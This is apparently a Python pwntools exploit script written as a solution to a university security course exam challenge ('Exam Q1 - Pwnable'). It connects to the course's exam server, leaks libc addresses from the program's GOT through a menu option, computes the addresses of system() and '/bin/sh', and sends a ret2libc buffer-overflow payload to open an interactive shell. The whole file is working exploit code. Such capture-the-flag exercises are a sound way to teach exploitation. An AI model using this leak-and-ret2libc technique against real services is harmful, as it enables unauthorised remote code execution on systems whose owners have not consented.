#!/usr/bin/env python
# UNSW COMP9447 18s2
# Exam Q1 - Pwnable
from pwn import *
import struct

# Exploit Variables
program = './alpha'
host = 'exam.6447.sec.edu.au'
port = 8001
elf = ELF(program)

# Setup Connection
conn = remote(host, port)
#  conn = process(program)

log.setLevel(logging.DEBUG)

# Display Challenge Prompt
log.debug(conn.recvuntil('(or press enter to refresh): '))

puts_offset = 0x067b40
system_offset = 0x03d200


def get_addr(addr):
    conn.sendline('d')
    conn.sendline('%d' % int(addr))
    leak = conn.recvline()
    conn.sendline("-")
    conn.recvuntil('(or press enter to refresh): ')
    return leak

# Leak Libc
leak = get_addr(elf.got['printf'])
log.info("printf: " + leak)
puts_leak = get_addr(elf.got['puts'])

log.info("puts: " + puts_leak)
base = int(puts_leak, 16) - puts_offset

log.info('base: ' + hex(base))
system_addr = base + system_offset
log.info('system: ' + hex(system_addr))

bin_sh_addr = base + 0x17e0cf

# Dismiss waitForKey

# [A]dd Stock
conn.sendline('a')
log.debug(conn.recvuntil('(e.g. FLAG): '))

# Display Exploit Values
text_base = elf.get_section_by_name('.text').header.sh_addr
log.info('TEXT_BASE: ' + hex(text_base))

# Construct Exploit Payload
payload = cyclic(20)
payload += p32(system_addr)
payload += 'AAAA' # padding
payload += p32(bin_sh_addr) # /bin//sh

# Send Exploit -> Display Flag
conn.sendline(payload)
conn.interactive()
#  recv = conn.recvall()
#  log.info(recv)
conn.close()


